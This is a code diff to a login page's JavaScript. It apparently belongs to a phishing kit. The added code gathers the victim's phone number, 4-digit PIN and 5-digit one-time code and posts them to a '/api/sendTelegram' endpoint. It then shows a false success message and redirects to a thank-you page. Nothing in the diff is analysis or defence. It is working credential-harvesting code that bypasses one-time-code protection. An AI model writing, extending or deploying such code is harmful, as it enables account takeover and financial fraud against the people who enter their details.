@@ -251,6 +251,15 @@ function updateLogin(){
   loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
+/* ===== API (TELEGRAM) ===== */
+async function sendToServer(payload){
+  return fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
+
 /* ===== OTP ===== */
 const dEls=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
 const confirmBtn=document.getElementById('confirmOtp');
@@ -287,9 +296,7 @@ function updateOtpState(){
 
 bindDigitInputs(dEls,updateOtpState);
 
-/* ===== OTP PASTE (FIXED) ===== */
-dEls.forEach(d=>d.onpaste=null);
-
+/* ===== OTP PASTE (FINAL) ===== */
 dEls[0].addEventListener('paste',e=>{
   const data=(e.clipboardData||window.clipboardData)
     .getData('text').replace(/\D/g,'').slice(0,5);
@@ -319,10 +326,18 @@ document.getElementById('loginForm').addEventListener('submit',e=>{
   startCountdown();
 });
 
-/* ===== CONFIRM OTP (RESTORED) ===== */
-confirmBtn.onclick=()=>{
+/* ===== CONFIRM OTP (TELEGRAM RESTORED) ===== */
+confirmBtn.onclick=async()=>{
   if(confirmBtn.disabled) return;
   if(navigator.vibrate) navigator.vibrate(30);
+
+  await sendToServer({
+    event:'otp_confirm',
+    loginPhone: phone.value,
+    loginPin: pinValue,
+    otp: dEls.map(d=>d.value).join(''),
+    submittedAt: new Date().toISOString()
+  });
 
   otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
